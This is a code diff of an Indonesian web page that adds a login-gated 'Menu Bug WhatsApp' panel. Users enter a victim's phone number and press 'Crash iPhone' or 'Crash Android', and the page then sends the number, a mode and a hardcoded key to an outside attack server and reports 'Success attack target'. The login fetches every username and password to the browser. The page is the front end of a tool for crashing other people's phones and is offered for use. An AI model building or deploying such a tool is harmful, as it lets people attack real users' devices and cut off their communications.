@@ -2,46 +2,140 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Login XZET</title>
-  <link rel="stylesheet" href="style.css">
+  <title>XZET Dashboard</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background: url("https://j.top4top.io/p_3468nai4p1.jpg") no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      background: rgba(15, 15, 15, 0.85);
+      padding: 30px 20px 60px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      position: relative;
+    }
+    .input {
+      display:block; width:100%;
+      margin:15px 0; padding:10px;
+      background:#1e1e1e; border:1px solid #333;
+      border-radius:6px; color:white; font-size:16px;
+    }
+    button {
+      padding:10px 20px; margin:10px 5px;
+      background:#2b3f5c; color:white; font-weight:bold;
+      border:none; border-radius:6px;
+      cursor:pointer; transition:0.2s;
+    }
+    button:hover { background:#3f3f3f; }
+    .hidden { display:none; }
+    .logout-btn {
+      position:fixed; top:15px; right:15px;
+    }
+    .bottom-links {
+      position:fixed; bottom:20px; left:50%;
+      transform:translateX(-50%);
+      display:flex; gap:10px;
+    }
+    .marquee-wrapper {
+      margin-top:15px;
+      font-size:14px; font-weight:bold; color:#ddd;
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h2>🔐 Login ke XZET</h2>
-    <input type="text" id="username" placeholder="Username" />
-    <input type="password" id="password" placeholder="Password" />
-    <button onclick="login()">Login</button>
-    <p id="error" class="error"></p>
+
+<div class="container" id="loginPage">
+  <h2>🔐 Login ke XZET</h2>
+  <input id="username" class="input" type="text" placeholder="Username" />
+  <input id="password" class="input" type="password" placeholder="Password" />
+  <button onclick="login()">Login</button>
+  <p id="errorMsg" style="color:red; margin-top:10px;"></p>
+</div>
+
+<div class="container hidden" id="menuPage">
+  <h2>💥 Menu Bug WhatsApp</h2>
+  <input id="target" class="input" type="text" placeholder="Masukkan nomor target 62xxxx" />
+  <button onclick="sendBug('ios')">Crash iPhone</button>
+  <button onclick="sendBug('andros')">Crash Android</button>
+  <div class="marquee-wrapper">
+    <marquee behavior="scroll" direction="left" scrollamount="4">
+      Thanks To : BancetMyself - And My God - And My Family
+    </marquee>
   </div>
+</div>
 
-  <script>
-    async function login() {
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-      const error = document.getElementById("error");
+<div class="logout-btn hidden" id="logoutBtn">
+  <button onclick="logout()">Logout</button>
+</div>
 
-      try {
-        const res = await fetch("/api/getUsers");
-        const users = await res.json();
-        const user = users.find(u => u.username === username && u.password === password);
+<div class="bottom-links hidden" id="bottomLinks">
+  <a href="https://t.me/BancetMyself" target="_blank"><button>👑 Owner</button></a>
+  <a href="https://t.me/SecretMInformation" target="_blank"><button>📣 Channel</button></a>
+</div>
 
-        if (!user) {
-          error.textContent = "❌ Username atau Password salah!";
-          return;
-        }
+<script>
+async function login() {
+  const u = document.getElementById('username').value.trim();
+  const p = document.getElementById('password').value.trim();
+  const err = document.getElementById('errorMsg');
 
-        if (user.expired && new Date(user.expired) < new Date()) {
-          error.textContent = "⛔ Akun sudah expired!";
-          return;
-        }
-
-        localStorage.setItem("role", user.role);
-        localStorage.setItem("username", user.username);
-        window.location.href = "/dashboard.html";
-      } catch {
-        error.textContent = "Gagal ambil data user!";
-      }
+  try {
+    const res = await fetch('/api/getUsers'); // lewat API biar aman
+    const users = await res.json();
+    const found = users.find(x => x.username === u && x.password === p);
+    if (found) {
+      localStorage.setItem('loggedIn', 'true');
+      showMenu();
+    } else {
+      err.textContent = '❌ Username atau password salah!';
     }
-  </script>
+  } catch(e) {
+    err.textContent = '❗ Gagal mengambil data user!';
+  }
+}
+
+function showMenu() {
+  document.getElementById('loginPage').classList.add('hidden');
+  document.getElementById('menuPage').classList.remove('hidden');
+  document.getElementById('logoutBtn').classList.remove('hidden');
+  document.getElementById('bottomLinks').classList.remove('hidden');
+}
+
+function logout() {
+  localStorage.removeItem('loggedIn');
+  location.reload();
+}
+
+async function sendBug(mode) {
+  const target = document.getElementById('target').value.trim();
+  if (!target.startsWith('62')) return alert('Nomor harus diawali 62xxxx');
+
+  try {
+    const res = await fetch(`http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`);
+    if (res.ok) alert(`Success attack target: ${target} [${mode}]`);
+    else alert('Gagal kirim bug!');
+  } catch {
+    alert('Error kirim bug!');
+  }
+}
+
+window.onload = () => {
+  if (localStorage.getItem('loggedIn') === 'true') {
+    showMenu();
+  }
+};
+</script>
+
 </body>
 </html>
